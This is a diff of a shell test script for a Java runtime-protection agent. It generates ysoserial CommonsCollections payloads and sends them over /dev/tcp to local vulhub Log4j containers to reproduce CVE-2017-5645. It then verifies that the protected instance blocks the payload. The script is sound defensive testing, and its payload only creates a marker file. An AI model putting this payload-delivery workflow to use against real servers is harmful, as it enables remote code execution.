@@ -4,8 +4,12 @@ set -euo pipefail
 cd "$(dirname "$0")/.."
 
 host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
+gradle_cache_dir=""
 
-docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
+source scripts/lib/ysoserial.sh
+
+gradle_cache_dir="$(mktemp -d "${TMPDIR:-/tmp}/ohmyrasp-gradle-cache-log4j5645.XXXXXX")"
+docker run --rm -u "$(id -u):$(id -g)" -e HOME=/tmp/gradle-home -e GRADLE_USER_HOME=/tmp/gradle-cache -v "${gradle_cache_dir}:/tmp/gradle-cache" -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
   gradle --no-daemon :agent-java8:agentJava8Jar
 
 image="${OHMYRASP_VULHUB_LOG4J_5645_IMAGE:-vulhub/log4j:2.8.1}"
@@ -14,11 +18,18 @@ protected_name="${OHMYRASP_VULHUB_LOG4J_5645_PROTECTED_NAME:-ohmyrasp-vulhub-log
 baseline_port="${OHMYRASP_VULHUB_LOG4J_5645_BASELINE_PORT:-19172}"
 protected_port="${OHMYRASP_VULHUB_LOG4J_5645_PROTECTED_PORT:-19173}"
 payload_dir="${OHMYRASP_YSOSERIAL_DIR:-/tmp/ohmyrasp-ysoserial}"
-payload_file="${payload_dir}/log4j-5645-cc5-touch.ser"
+ysoserial_jar="${payload_dir}/ysoserial.jar"
+payload_gadgets=(
+  CommonsCollections5
+  CommonsCollections6
+  CommonsCollections7
+)
 success_file="/tmp/ohmyrasp-log4j5645-success"
 baseline_dir="logs/vulhub-log4j-2017-5645-java8-baseline"
 protected_dir="logs/vulhub-log4j-2017-5645-java8-protected"
 protected_log="${protected_dir}/events.jsonl"
+verified_gadget=""
+verified_payload_file=""
 
 copy_artifacts() {
   local name="$1"
@@ -32,18 +43,28 @@ cleanup() {
   copy_artifacts "$baseline_name" "$baseline_dir"
   copy_artifacts "$protected_name" "$protected_dir"
   docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
+  if [[ -n "${gradle_cache_dir:-}" ]]; then
+    rm -rf "${gradle_cache_dir}" >/dev/null 2>&1 || true
+  fi
 }
 trap cleanup EXIT
 
+payload_file_for_gadget() {
+  local gadget="$1"
+  printf '%s/log4j-5645-%s-touch.ser' "$payload_dir" "$gadget"
+}
+
 prepare_payload() {
-  mkdir -p "$payload_dir"
-  if [[ ! -s "${payload_dir}/ysoserial.jar" ]]; then
-    rm -rf "${payload_dir}/src"
+  # shellcheck source=scripts/lib/ysoserial.sh
+  source scripts/lib/ysoserial.sh
+  prepare_ysoserial_jar "$ysoserial_jar"
+
+  for gadget in "${payload_gadgets[@]}"; do
+    local payload_file
+    payload_file="$(payload_file_for_gadget "$gadget")"
     docker run --rm -v "${payload_dir}:/work" -w /work maven:3.8.1-jdk-8 \
-      bash -lc 'git clone --depth 1 https://github.com/frohoff/ysoserial.git src && cd src && mvn -q -DskipTests package && cp target/ysoserial-*-all.jar /work/ysoserial.jar'
-  fi
-  docker run --rm -v "${payload_dir}:/work" -w /work maven:3.8.1-jdk-8 \
-    bash -lc '/usr/local/openjdk-8/bin/java -jar ysoserial.jar CommonsCollections5 "touch /tmp/ohmyrasp-log4j5645-success" > /work/log4j-5645-cc5-touch.ser && test -s /work/log4j-5645-cc5-touch.ser'
+      bash -lc "/usr/local/openjdk-8/bin/java -jar ysoserial.jar ${gadget} 'touch ${success_file}' > /work/$(basename "$payload_file") && test -s /work/$(basename "$payload_file")"
+  done
 }
 
 wait_for_tcp_server() {
@@ -81,10 +102,12 @@ wait_for_protected_startup() {
 send_payload() {
   local port="$1"
   local dir="$2"
+  local payload_file="$3"
+  local gadget="$4"
   if cat "$payload_file" > "/dev/tcp/127.0.0.1/${port}"; then
-    printf 'payload_send_status=ok\n' >> "${dir}/attempts.log"
+    printf 'payload_gadget=%s payload_file=%s payload_send_status=ok\n' "$gadget" "$(basename "$payload_file")" >> "${dir}/attempts.log"
   else
-    printf 'payload_send_status=connection_closed\n' >> "${dir}/attempts.log"
+    printf 'payload_gadget=%s payload_file=%s payload_send_status=connection_closed\n' "$gadget" "$(basename "$payload_file")" >> "${dir}/attempts.log"
   fi
 }
 
@@ -108,21 +131,30 @@ start_protected() {
 
 run_baseline() {
   start_baseline
-  docker exec "$baseline_name" rm -f "$success_file"
-  send_payload "$baseline_port" "$baseline_dir"
 
-  for attempt in $(seq 1 10); do
-    if docker exec "$baseline_name" test -e "$success_file"; then
-      printf 'baseline_marker_attempt=%s\n' "$attempt" >> "${baseline_dir}/attempts.log"
-      copy_artifacts "$baseline_name" "$baseline_dir"
-      docker rm -f "$baseline_name" >/dev/null 2>&1 || true
-      return
-    fi
-    sleep 1
+  for gadget in "${payload_gadgets[@]}"; do
+    local payload_file
+    payload_file="$(payload_file_for_gadget "$gadget")"
+    for exploit_attempt in $(seq 1 3); do
+      docker exec "$baseline_name" rm -f "$success_file"
+      send_payload "$baseline_port" "$baseline_dir" "$payload_file" "$gadget"
+      for marker_attempt in $(seq 1 5); do
+        if docker exec "$baseline_name" test -e "$success_file"; then
+          verified_gadget="$gadget"
+          verified_payload_file="$payload_file"
+          printf 'baseline_gadget=%s baseline_exploit_attempt=%s baseline_marker_attempt=%s\n' "$gadget" "$exploit_attempt" "$marker_attempt" >> "${baseline_dir}/attempts.log"
+          copy_artifacts "$baseline_name" "$baseline_dir"
+          docker rm -f "$baseline_name" >/dev/null 2>&1 || true
+          return
+        fi
+        sleep 1
+      done
+      sleep 1
+    done
   done
 
   docker logs "$baseline_name" >&2 || true
-  echo "baseline Log4j CVE-2017-5645 did not execute the CommonsCollections5 payload" >&2
+  echo "baseline Log4j CVE-2017-5645 did not execute any ysoserial payload (${payload_gadgets[*]})" >&2
   exit 1
 }
 
@@ -135,8 +167,18 @@ run_protected() {
   fi
 
   docker exec "$protected_name" rm -f "$success_file"
-  send_payload "$protected_port" "$protected_dir"
-  sleep 2
+  if [[ -z "$verified_payload_file" || -z "$verified_gadget" ]]; then
+    verified_gadget="${payload_gadgets[0]}"
+    verified_payload_file="$(payload_file_for_gadget "$verified_gadget")"
+  fi
+  send_payload "$protected_port" "$protected_dir" "$verified_payload_file" "$verified_gadget"
+  for attempt in $(seq 1 10); do
+    if grep -Eq '"algorithm":"java8_deserialization_gadget_class".*"action":"block"' "$protected_log"; then
+      printf 'protected_block_gadget=%s protected_block_attempt=%s\n' "$verified_gadget" "$attempt" >> "${protected_dir}/attempts.log"
+      break
+    fi
+    sleep 1
+  done
 
   if docker exec "$protected_name" test -e "$success_file"; then
     echo "protected Log4j CVE-2017-5645 created ${success_file} despite Java8 RASP" >&2
